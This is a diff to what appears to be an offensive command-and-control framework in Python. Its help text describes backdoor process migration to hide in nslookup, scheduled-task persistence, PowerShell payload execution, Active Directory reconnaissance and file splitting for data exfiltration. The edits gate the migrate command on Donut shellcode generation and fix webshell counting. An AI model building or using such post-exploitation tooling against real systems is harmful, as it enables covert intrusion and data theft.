@@ -102,7 +102,7 @@ class cmd:
      ['bloodhound', 'run bloodhound to collect all the information about the AD'],
      ['unamanged_powershell', 'run powershell payload through the dotnet agent'],
      ['persist_schtasks', 'persistence using schedule tasks'],
-     ['migrate', 'migrate to new process ( default nslookup ) to hide the backdoor '],
+     ['migrate', 'migrate to new process ( default nslookup ) to hide the backdoor , this command will only work if you enabled donut in campaign creation '],
      ['processlist', 'list processes formated ( Name , ID , Commandline)'],
      ['split', 'split file to small size files for data exfiltration (use join command for files in current server or use join.ps1 script to join data on windows )'],
      ['join', 'join splited file names ( include the original file name in the path and the script will know the file parts)'],
@@ -575,6 +575,9 @@ class cmd:
         if config.Implant_Type!='agent':
             print("This command can only be used in agent mode")
             return
+        if config.Donut==False:
+            print("you can't run this command as Donut disabled in campaign creation")
+            return
         global loaded
         shellcode=donut.create(file="payloads/dropper_cs.exe")
         fp = open('agents/Migrator.ninja', 'r')
@@ -655,7 +658,9 @@ class cmd:
 
         URL=args[1]
         KEY=args[2]
-
+        config.WEBSHELL_COUNT=0
+        for i in config.WEBSHELLS:
+            config.WEBSHELL_COUNT=config.WEBSHELL_COUNT+1
         config.WEBSHELLS.update({config.WEBSHELL_COUNT:[str(config.WEBSHELL_COUNT+1),URL,KEY]})
         config.WEBSHELL_COUNT=config.WEBSHELL_COUNT+1
 
